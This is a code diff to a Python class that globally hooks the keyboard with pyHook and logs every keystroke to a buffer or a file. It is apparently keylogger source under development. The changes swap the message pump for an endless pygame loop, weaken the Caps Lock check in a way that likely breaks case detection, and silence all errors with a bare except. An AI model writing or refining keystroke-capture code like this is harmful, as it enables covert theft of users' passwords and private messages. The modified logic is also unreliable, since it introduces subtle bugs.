@@ -2,11 +2,11 @@ import threading
 import pyHook
 import os.path
 import general
-import pythoncom
 from pyHook import GetKeyState, HookConstants
 from get_local_addr import get_local_addr
 import time
 import os
+import pygame
 
 
 class Logger:
@@ -45,7 +45,9 @@ class Logger:
         self.hook.HookKeyboard()
 
         # Starts the event pump
-        pythoncom.PumpMessages()
+        pygame.init()
+        while True:
+            pygame.event.pump()
 
     def pause(self):
         self.paused = True
@@ -89,7 +91,7 @@ class Logger:
                     return True
 
                 # ALL UPPERCASE LETTERS
-                elif GetKeyState(HookConstants.VKeyToID('VK_CAPITAL')) & 1:
+                elif GetKeyState(HookConstants.VKeyToID('VK_CAPITAL')):
                     if GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT')):
                         if self.paused:
                             self.buffer += chr(event.Ascii)
@@ -243,9 +245,5 @@ class Logger:
                 return True
 
         except:
-            if self.paused:
-                self.buffer += "<<?>>"
-            else:
-                general.append_to_file(self.path, "<<?>>")
-            return True
+            pass
 
